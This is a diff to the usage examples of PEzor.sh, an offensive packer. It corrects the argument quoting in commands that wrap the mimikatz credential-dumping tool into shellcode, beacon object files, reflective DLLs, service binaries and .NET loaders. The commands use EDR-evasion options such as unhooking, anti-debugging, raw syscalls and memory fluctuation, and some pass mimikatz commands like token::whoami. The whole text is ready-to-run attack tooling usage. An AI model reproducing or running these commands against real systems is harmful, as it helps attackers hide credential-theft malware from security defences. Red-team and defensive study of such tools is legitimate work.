@@ -103,25 +103,25 @@ EXAMPLES
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (fluctuate to READWRITE when sleeping)
-  $ PEzor.sh -fluctuate=RW -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p coffee sleep 5000 coffee exit
+  $ PEzor.sh -fluctuate=RW -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
   # 64-bit (fluctuate to NOACCESS when sleeping)
-  $ PEzor.sh -fluctuate=NA -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p coffee sleep 5000 coffee exit
+  $ PEzor.sh -fluctuate=NA -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
   # 64-bit (beacon object file)
-  $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p log c:\users\public\mimi.out token::whoami exit
+  $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (beacon object file w/ cleanup)
-  $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p log c:\users\public\mimi.out token::whoami exit
+  $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (reflective dll)
-  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p log c:\users\public\mimi.out token::whoami exit
+  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (service exe)
-  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p log c:\users\public\mimi.out token::whoami exit
+  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (service dll)
-  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p log c:\users\public\mimi.out token::whoami exit
+  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (dotnet)
-  $ PEzor.sh -format=dotnet -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p log c:\users\public\mimi.out token::whoami exit
+  $ PEzor.sh -format=dotnet -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (dotnet-pinvoke)
-  $ PEzor.sh -format=dotnet-pinvoke -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p log c:\users\public\mimi.out token::whoami exit
+  $ PEzor.sh -format=dotnet-pinvoke -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (dotnet-createsection)
-  $ PEzor.sh -format=dotnet-createsection -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p log c:\users\public\mimi.out token::whoami exit
+  $ PEzor.sh -format=dotnet-createsection -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
